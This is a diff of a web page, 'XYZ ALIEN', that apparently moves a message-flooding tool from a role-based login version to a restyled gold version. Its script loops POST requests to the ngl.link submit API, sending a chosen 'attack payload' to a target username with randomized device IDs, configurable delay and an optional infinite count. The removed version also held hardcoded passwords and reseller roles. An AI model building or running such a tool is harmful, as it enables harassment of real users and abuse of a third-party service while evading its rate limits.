@@ -3,341 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XYZ ALIEN V4.8 - MATRIX ARCHITECT</title>
+    <title>XYZ ALIEN V5.1 - PURE GOLD</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap');
         
         :root { 
-            --blood: #ff0000; 
-            --dark: #000000; 
-            --terminal-gray: #5a7a5a;
-            --terminal-green: #44cc44;
+            --gold: #ffd700;
+            --gold-glow: 0 0 15px rgba(255, 215, 0, 0.5);
+            --gold-dim: #b8860b;
+            --dark: #000000;
         }
 
         * { box-sizing: border-box; }
         body { 
             background: var(--dark); 
-            color: white; 
+            color: var(--gold); /* Teks dasar jadi emas */
             font-family: 'Share Tech Mono', monospace; 
             margin: 0; 
             overflow-x: hidden;
-        }
-
-        /* LOGIN PAGE - PERFECT CENTER */
-        #login-screen {
-            position: fixed; 
-            inset: 0; 
-            background: #000; 
-            z-index: 9999;
-            display: flex; 
-            justify-content: center; 
+            display: flex;
+            justify-content: center;
             align-items: center;
-        }
-        .login-box {
-            width: 100%; 
-            max-width: 350px; 
-            padding: 40px 30px; 
-            border: 1px solid #111;
-            background: #050000; 
-            text-align: center;
-        }
-        .login-box h2 {
-            font-family: 'Orbitron';
-            color: var(--blood);
-            font-size: 22px;
-            margin-bottom: 30px;
-            letter-spacing: 5px;
+            min-height: 100vh;
         }
 
-        /* MAIN LAYOUT - V3 VIBES (BLANK & CLEAN) */
-        header { 
-            padding: 20px; 
-            border-bottom: 1px solid #111; 
-            display: flex; 
-            justify-content: space-between; 
-            font-size: 11px; 
-            color: #444; 
+        /* RAINBOW TEXT ANIMATION (HANYA UNTUK XYZ ALIEN) */
+        @keyframes rainbow-text {
+            0% { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
+            20% { color: #ffff00; text-shadow: 0 0 10px #ffff00; }
+            40% { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
+            60% { color: #00ffff; text-shadow: 0 0 10px #00ffff; }
+            80% { color: #0000ff; text-shadow: 0 0 10px #0000ff; }
+            100% { color: #ff00ff; text-shadow: 0 0 10px #ff00ff; }
+        }
+
+        /* MAIN CARD - FULL GOLD BORDER */
+        .v5-card { 
+            width: 100%;
+            max-width: 450px;
+            background: rgba(5, 5, 5, 0.95);
+            border: 2px solid var(--gold); /* Border permanen emas */
+            padding: 30px;
+            box-shadow: var(--gold-glow); /* Efek glow emas */
+            margin: 20px;
+            border-radius: 2px;
+        }
+
+        h2.rainbow-title {
+            font-family: 'Orbitron';
+            text-align: center;
+            font-size: 32px;
+            margin-bottom: 5px;
+            animation: rainbow-text 4s linear infinite; /* Hanya ini yang rainbow */
+            letter-spacing: 4px;
+            font-weight: 900;
+        }
+
+        .version {
+            text-align: center;
+            font-size: 10px;
+            color: #555; /* Versi agak redup */
+            margin-bottom: 25px;
+            display: block;
             text-transform: uppercase;
         }
 
-        .container { 
-            display: flex; 
-            flex-wrap: wrap; 
-            padding: 15px; 
-            gap: 15px; 
-        }
-
-        .card { 
-            border: 1px solid #0f0f0f; 
-            background: transparent;
-            padding: 20px; 
-            flex: 1; 
-            min-width: 320px; 
-        }
-
-        h3 { 
-            font-family: 'Orbitron'; 
-            color: var(--blood); 
-            font-size: 12px; 
-            margin-top: 0; 
-            margin-bottom: 20px;
-            letter-spacing: 2px;
-        }
-
-        /* INPUTS */
-        input, textarea, select { 
+        /* INPUTS - FULL GOLD */
+        input, textarea { 
             width: 100%; 
             background: transparent; 
             border: none; 
-            border-bottom: 1px solid #1a1a1a;
-            color: #fff; 
+            border-bottom: 1px solid #333; /* Garis bawah awal redup */
+            color: var(--gold); /* Teks input emas */
             padding: 12px 5px; 
-            margin: 8px 0; 
+            margin: 10px 0; 
             outline: none; 
             font-family: inherit;
-            font-size: 13px;
         }
-        input:focus { border-bottom: 1px solid var(--blood); }
+        input:focus { 
+            border-bottom: 1px solid var(--gold); /* Garis bawah nyala emas */
+            box-shadow: 0 5px 10px -5px rgba(255, 215, 0, 0.2);
+        }
+        ::placeholder { color: #444; } /* Placeholder redup */
 
+        /* BUTTONS - PURE GOLD */
         button { 
             width: 100%; 
-            padding: 14px; 
+            padding: 15px; 
             background: transparent; 
-            color: var(--blood); 
-            border: 1px solid var(--blood); 
+            color: var(--gold); 
+            border: 2px solid var(--gold); 
             font-family: 'Orbitron'; 
-            font-size: 11px;
             cursor: pointer; 
             margin-top: 15px;
             transition: 0.3s;
+            text-transform: uppercase;
+            font-weight: bold;
+            letter-spacing: 1px;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.1);
         }
         button:hover { 
-            background: var(--blood); 
+            background: var(--gold); 
             color: #000; 
+            box-shadow: var(--gold-glow); 
         }
 
-        /* TERMINAL HIJAU ABU-ABU */
-        .terminal { 
+        /* TERMINAL PURE GOLD */
+        .terminal-gold { 
             background: #000; 
-            height: 220px; 
-            border: 1px solid #0f0f0f; 
-            padding: 10px; 
+            height: 200px; 
+            border: 1px solid #1a1a1a; 
+            padding: 12px; 
             font-size: 11px; 
-            color: var(--terminal-gray); 
+            color: var(--gold-dim); /* Log lama emas redup */
             overflow-y: auto; 
-            margin-top: 15px;
-            border-left: 2px solid #1a1a1a;
+            margin-top: 20px;
+            border-left: 3px solid var(--gold); /* Garis kiri emas nyala */
         }
-        .new-log { 
-            color: var(--terminal-green); 
-            text-shadow: 0 0 5px rgba(68, 204, 68, 0.2); 
-        }
-
-        .role-badge {
-            font-size: 9px;
-            border: 1px solid #333;
-            padding: 1px 4px;
-            margin-left: 8px;
-            color: #888;
+        .gold-log-new { 
+            color: var(--gold); /* Log baru emas nyala */
+            text-shadow: 0 0 5px rgba(255, 215, 0, 0.4); 
         }
 
         .hidden { display: none !important; }
-
-        @media (max-width: 768px) {
-            .container { flex-direction: column; }
-            .card { min-width: 100%; }
-        }
     </style>
 </head>
 <body>
 
-<div id="login-screen">
-    <div class="login-box">
-        <h2>XYZ ALIEN</h2>
-        <input type="text" id="l-usn" placeholder="USERNAME">
-        <input type="password" id="l-pw" placeholder="PASSWORD">
-        <button onclick="auth()">VERIFY</button>
-    </div>
-</div>
+    <div class="v5-card">
+        <h2 class="rainbow-title">XYZ ALIEN</h2>
+        <span class="version">V5.1 PURE GOLD EDITION</span>
 
-<div id="main-app" class="hidden">
-    <header>
-        <div id="greet"></div>
-        <div>V4.8 MATRIX ARCHITECT</div>
-    </header>
+        <input type="text" id="target" placeholder="TARGET USN">
+        <textarea id="msg" rows="3" placeholder="ATTACK PAYLOAD"></textarea>
+        
+        <input type="number" id="delay" placeholder="DELAY (ms)">
+        <input type="text" id="count" placeholder="COUNT (00=∞)">
 
-    <div class="container">
-        <div id="side-mgmt" class="card hidden">
-            <div id="role-maker" class="hidden">
-                <h3>ROLE ARCHITECT</h3>
-                <input type="text" id="role-name" placeholder="ROLE NAME">
-                <select id="role-auth">
-                    <option value="high">HIGH (MASTER ACCESS)</option>
-                    <option value="mid">MID (MANAGER ACCESS)</option>
-                    <option value="low">LOW (STRIKE ONLY)</option>
-                </select>
-                <button onclick="addNewRole()">BUILD ROLE</button>
-                <hr style="border:0; border-top:1px solid #111; margin: 20px 0;">
-            </div>
-
-            <h3>ENTITY DEPLOYMENT</h3>
-            <input type="text" id="n-usn" placeholder="USN">
-            <input type="password" id="n-pw" placeholder="PW">
-            <select id="n-role-list"></select>
-            <input type="number" id="n-delay" placeholder="FIXED DELAY (ms)">
-            <input type="text" id="n-count" placeholder="FIXED COUNT (00=∞)">
-            <button onclick="createEntity()">SAVE ENTITY</button>
-            
-            <div id="db-list" style="margin-top:25px;"></div>
-        </div>
-
-        <div class="card">
-            <h3>STRIKE MODULE</h3>
-            <input type="text" id="target" placeholder="TARGET USN">
-            <textarea id="msg" rows="3" placeholder="PAYLOAD MESSAGE"></textarea>
-            
-            <div id="custom-params" class="hidden">
-                <input type="number" id="c-delay" placeholder="CUSTOM DELAY (ms)">
-                <input type="text" id="c-count" placeholder="CUSTOM COUNT (00=∞)">
-            </div>
-
-            <div id="lock-notice" class="hidden" style="color:#222; font-size:10px; margin: 10px 0; letter-spacing: 1px;">
-                [!] PARAMETERS ENCRYPTED & LOCKED BY ARCHITECT
-            </div>
-
-            <button id="fire-btn" onclick="startStrike()">EXECUTE</button>
-            <button id="stop-btn" class="hidden" onclick="stopStrike()" style="border-color:#300; color:#300;">ABORT</button>
-            
-            <div id="strike-status" style="font-size: 10px; color: #333; margin-top: 15px; border-top: 1px solid #0f0f0f; padding-top: 10px;">
-                SYSTEM STANDBY
-            </div>
-
-            <div class="terminal" id="term"></div>
+        <button id="fire-btn" onclick="startStrike()">EXECUTE GOLD STRIKE 🩸</button>
+        <button id="stop-btn" class="hidden" onclick="stopStrike()" style="border-color:#300; color:#300;">ABORT MISSION</button>
+        
+        <div class="terminal-gold" id="term">
+            <div class="gold-log-new">> SYSTEM STANDBY...</div>
         </div>
     </div>
-</div>
 
 <script>
-    // CORE DATABASE
-    const defaultUsers = [
-        {usn: "XYZXYTERZ", pw: "ALIEN", role: "DEV", d: 0, c: 0},
-        {usn: "XYZ ALIEN", pw: "xx", role: "ALIEN", d: 0, c: 0}
-    ];
-    const defaultRoles = [
-        {name: "DEV", auth: "high"}, {name: "ALIEN", auth: "high"},
-        {name: "ADMIN", auth: "high"}, {name: "PT", auth: "mid"},
-        {name: "RESELLER", auth: "mid"}, {name: "USER", auth: "low"}
-    ];
-
-    let db = JSON.parse(localStorage.getItem('v48_db')) || defaultUsers;
-    let roles = JSON.parse(localStorage.getItem('v48_roles')) || defaultRoles;
-    let session = null;
     let active = false;
-
-    function saveAll() {
-        localStorage.setItem('v48_db', JSON.stringify(db));
-        localStorage.setItem('v48_roles', JSON.stringify(roles));
-    }
-
-    function auth() {
-        const u = document.getElementById('l-usn').value;
-        const p = document.getElementById('l-pw').value;
-        const user = db.find(x => x.usn === u && x.pw === p);
-        if(user) {
-            session = user;
-            document.getElementById('login-screen').classList.add('hidden');
-            document.getElementById('main-app').classList.remove('hidden');
-            init();
-        } else { alert("ACCESS DENIED."); }
-    }
-
-    function init() {
-        document.getElementById('greet').innerHTML = `HALO, ${session.usn} | ROLE: ${session.role}`;
-        const myRoleInfo = roles.find(r => r.name === session.role);
-        
-        // Setup Management Otoritas
-        if(myRoleInfo && (myRoleInfo.auth === "high" || myRoleInfo.auth === "mid")) {
-            document.getElementById('side-mgmt').classList.remove('hidden');
-            if(session.role === "DEV") document.getElementById('role-maker').classList.remove('hidden');
-            updateDropdown();
-            renderDB();
-        }
-
-        // Setup Strike Otoritas
-        if(session.role !== "USER" && session.role !== "RESELLER") {
-            document.getElementById('custom-params').classList.remove('hidden');
-        } else {
-            document.getElementById('lock-notice').classList.remove('hidden');
-            document.getElementById('strike-status').innerHTML = `LOCKED PARAMETERS: ${session.d}ms / ${session.c === '00' ? '∞' : session.c} LIMIT`;
-        }
-        log("ESTABLISHING SECURE CONNECTION...");
-        log("SYSTEM STABLE. READY FOR OVERRIDE.");
-    }
-
-    function updateDropdown() {
-        const sel = document.getElementById('n-role-list');
-        sel.innerHTML = "";
-        roles.forEach(r => {
-            if(session.role === "DEV") sel.innerHTML += `<option value="${r.name}">${r.name}</option>`;
-            else if(session.role === "ALIEN" && r.name !== "DEV") sel.innerHTML += `<option value="${r.name}">${r.name}</option>`;
-            else if(r.auth === "low" || r.name === "PT") sel.innerHTML += `<option value="${r.name}">${r.name}</option>`;
-        });
-    }
-
-    function addNewRole() {
-        const n = document.getElementById('role-name').value.toUpperCase();
-        const a = document.getElementById('role-auth').value;
-        if(!n || roles.find(r => r.name === n)) return;
-        roles.push({name: n, auth: a});
-        saveAll(); updateDropdown();
-        log(`ROLE ${n} ARCHITECTED SUCCESSFULLY.`);
-    }
-
-    function createEntity() {
-        const u = document.getElementById('n-usn').value, p = document.getElementById('n-pw').value;
-        const d = document.getElementById('n-delay').value, c = document.getElementById('n-count').value;
-        const r = document.getElementById('n-role-list').value;
-        if(!u || !p || !d || !c) return;
-        db.push({usn: u, pw: p, role: r, d: parseInt(d), c: c});
-        saveAll(); renderDB();
-        log(`ENTITY ${u} (${r}) STORED IN DATABASE.`);
-    }
-
-    function renderDB() {
-        const list = document.getElementById('db-list');
-        list.innerHTML = "<h3>SYNDICATE DB</h3>";
-        db.forEach((u, i) => {
-            let canDel = (session.role === "DEV") || (session.role === "ALIEN" && u.role !== "DEV");
-            if(u.usn === session.usn) canDel = false;
-            list.innerHTML += `<div style="font-size:11px; color:#222; margin-bottom:8px; display:flex; justify-content:space-between;">
-                <span>${u.usn} <span class="role-badge">${u.role}</span></span>
-                ${canDel ? `<span onclick="del(${i})" style="color:red; cursor:pointer;">[DELETE]</span>`:''}
-            </div>`;
-        });
-    }
-
-    function del(i) { db.splice(i,1); saveAll(); renderDB(); log("ENTITY TERMINATED."); }
 
     function log(m) {
         const t = document.getElementById('term');
-        t.innerHTML = `<div class="new-log">> ${m}</div>` + t.innerHTML;
+        // Log baru warna emas nyala, log lama redup
+        t.innerHTML = `<div class="gold-log-new">> ${m}</div>` + t.innerHTML;
     }
 
-    function stopStrike() { active = false; }
+    function stopStrike() { 
+        active = false; 
+    }
 
     async function startStrike() {
         const target = document.getElementById('target').value;
         const msg = document.getElementById('msg').value;
-        
-        let d, cRaw;
-        if(session.role === "USER" || session.role === "RESELLER") {
-            d = session.d; cRaw = session.c;
-        } else {
-            d = parseInt(document.getElementById('c-delay').value) || 500;
-            cRaw = document.getElementById('c-count').value;
-        }
+        const d = parseInt(document.getElementById('delay').value) || 500;
+        const cRaw = document.getElementById('count').value;
 
-        if(!target || !msg) return alert("INPUT REQUIRED.");
+        if(!target || !msg) return alert("REQUIRED: TARGET & PAYLOAD");
+
         active = true;
         document.getElementById('fire-btn').classList.add('hidden');
         document.getElementById('stop-btn').classList.remove('hidden');
@@ -346,22 +177,25 @@
         let limit = isInf ? Infinity : parseInt(cRaw);
         let sent = 0;
 
-        log(`STRIKE INITIATED ON: ${target}`);
+        log(`INITIATING GOLD SEQUENCE: ${target}`);
 
         while(active && sent < limit) {
-            fetch(`https://ngl.link/api/submit`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams({username: target, question: msg, deviceId: 'mx-'+Math.random()})
-            });
-            sent++;
-            if(sent % 5 === 0 || !isInf) log(`SENT: ${sent}${isInf?'/∞':''}`);
+            try {
+                fetch(`https://ngl.link/api/submit`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams({username: target, question: msg, deviceId: 'gold-'+Math.random()})
+                });
+                sent++;
+                if(sent % 5 === 0 || !isInf) log(`GOLD_STRIKE: ${sent}${isInf?'/∞':''}`);
+            } catch(e) {}
             await new Promise(r => setTimeout(r, d));
         }
+
         active = false;
         document.getElementById('fire-btn').classList.remove('hidden');
         document.getElementById('stop-btn').classList.add('hidden');
-        log("STRIKE SEQUENCE FINISHED.");
+        log("GOLD SEQUENCE COMPLETED.");
     }
 </script>
 
